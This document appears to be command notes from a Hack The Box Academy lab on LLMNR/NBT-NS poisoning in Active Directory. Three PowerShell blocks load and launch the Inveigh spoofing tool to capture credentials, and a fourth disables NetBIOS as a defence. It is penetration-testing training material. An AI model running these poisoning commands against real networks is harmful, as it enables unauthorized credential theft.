# Section 7: LLMNR/NBT-NS Poisoning - from Windows

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1420
- Code/command blocks: 4

> Terminal output is omitted; only commands & scripts are captured.

## 1. `powershell` _(output omitted)_

```powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
```

## 2. `powershell` _(output omitted)_

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

## 3. `powershell` _(output omitted)_

```powershell
.\Inveigh.exe
```

## 4. `powershell`

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

